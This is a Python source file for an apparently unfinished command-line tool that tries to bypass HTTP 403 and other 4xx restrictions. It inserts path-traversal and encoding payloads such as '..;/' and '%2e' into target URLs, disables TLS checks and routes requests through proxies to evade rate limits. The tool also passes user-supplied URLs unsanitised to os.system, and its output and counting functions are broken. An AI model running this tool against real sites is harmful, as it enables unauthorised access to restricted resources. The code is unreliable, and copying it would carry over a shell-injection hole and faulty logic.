# A FAIRE :

# finir la fonction output
# finir le compteur
# optimiser le code
# --------------------------------

######################################
# MIT LICENSE @RistBS - 2021
# Author and contributor : RistBS, Elieroc
# RistBS : https://github.com/RistBS
# Elieroc : https://github.com/Elieroc
######################################



from banner import banner

from sys import exc_info
from time import sleep

import os
import requests
import json
import argparse
import urllib3
import textwrap

from requests.adapters import HTTPAdapter
from requests.packages.urllib3.util.retry import Retry

def args_manager():
    global parser
    parser = argparse.ArgumentParser(description='tool to bypass client side error code 4xx')
    parser.add_argument('url', help='enter the URL with domain only')
    parser.add_argument('--path', help='give the path which has the answer 4xx')
    parser.add_argument('--params', help='give the necessary parameters to have a valid answer')
    parser.add_argument('--proxy', help='use proxies to avoid requests limit')
    parser.add_argument('--header', help='add headers')
    parser.add_argument('--batchtrue', action='store_true', help='responds positively to any request')
    parser.add_argument('--batchfalse', action='store_true', help='responds negatively to any request')
    parser.add_argument('--useragent', help='use another user-agent than the one defined by python')
    parser.add_argument('-o', '--output', type=str, help='save the results in a file')
    global args
    args = parser.parse_args()


def connection_check():
    print ("\n\033[61m[~] Trying to find internet connection\033[0m")
    try:
        requests.get('https://github.com', timeout = 3)
        print ("\n\033[32m[+]\033[0m connection found !\n")
    except requests.ConnectionError:
        print ("\033[91m[-]\033[0m no internet connection")
        exit()

def output(response, *args, **kwargs):
    #word = ["X-Powered-By", "User-Agent", "chunked"]
    headers = lambda d: '\n'.join(f'{k}: {v}' for k, v in d.items()) 
    print(textwrap.dedent('''
        ---------------- request ----------------
        \033[92m{req.method}\033[0m \033[102m\033[94m{req.url}\033[0m
        {reqhdrs}

        {req.body}
        ---------------- response ----------------
        \033[91m{res.status_code}\033[0m {res.reason} \033[102m\033[94m{res.url}\033[0m

        headers :

        \033[92m{reshdrs}\033[0m
    ''').format(req=response.request, res=response, reqhdrs=headers(response.request.headers), reshdrs=headers(response.headers),))

#class exploit:
def payload_tester():

    params = args.params
    proxies = args.proxy
    user_agent = {'User-agent': '{}'.format(args.useragent)}

    header = {'Authorization': '{}'.format(args.header)}
    print(f"header : {header}")
    
    print(f"Parameter : {params}")
    print(f"Proxy : {proxies}")
    print(f"User-Agent : {user_agent}")

    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    requests.packages.urllib3.disable_warnings()
    payloads = ['%2e', '/.', '..;/', '//', '/./', '/', '..']

    try:
        for payload in payloads:
            print("\033[92m\n\n[+]\033[0m \033[4mTesting the following payload \033[0m:")
            sleep(3)
            if args.url and args.path:
                link = args.url + payload + args.path
                r = requests.get(link, params=params, verify=False, proxies=proxies, hooks={'response': output})

                positives_numbers_code = [200, 300, 102]
                negatives_numbers_code = [500, 404, 403]
                all_number_code = positives_numbers_code + negatives_numbers_code
                for code_number in positives_numbers_code:
                    if r.status_code == code_number:
                        print(f"\033[92m[+]\033[0m True with code {code_number} for : {link}")
                for code_number in negatives_numbers_code:
                    if r.status_code == code_number:
                        print(f"\033[92m[+]\033[0m False with code {code_number} for : {link}")
                if args.batchtrue:
                    firefox_launcher(link, True)
                elif args.batchfalse:
                    print("\033[91m[!]\033[0m Firefox will not be launch for this URL")
                else:
                    firefox_launcher(link)
                        
                print("URL :" + args.url + payload + args.path) # 2x args.path ( url -(here)- payload )
                print("payload : \033[91m{}\033[0m".format(payload))
                print("\033[101m\n###########################################################################\033[0m")
                count = len(payloads)

        #for positives_numbers_code in r.status_code:
         #   print(f"\n\033[91m[!]\033[0m Résultat trouvé. {str(positives_numbers_code)}/" + str(count))
        code_number = str(code_number)
        o = sum(int(n) for n in code_number)
        print(o)
        print(code_number)
        print(all_number_code)

        if args.output:
            output_file()
        
    except requests.exceptions.ConnectionError:
        print("Connection refused")
        sleep(12)
        

    except requests.exceptions.RequestException or requests.exceptions.HTTPError as e:
        raise SystemExit(e)

def output_file():
    f_output = output(response=output)
    file = open(args.output)
    try:
        with open(args.output, 'w') as file:
            file.write(f_output)
            file.close()
    except IOError as e:
        print("I/O error({0}): {1}".format(e.errno, e.strerror))

def firefox_launcher(link, batch=False):
    if batch == True :
        os.system(f'firefox {link}')
    else:
        launch = input("launch the modified URL with firefox ? [Y,N] : ")
        if launch == 'Y' or launch == 'y':
            os.system(f'firefox {link}')
        else:
            print("\033[91m[!]\033[0m Firefox will not be launch for this URL")


def main():
    banner()
    args_manager()
    connection_check()
    payload_tester()

if __name__ == "__main__":
    main()


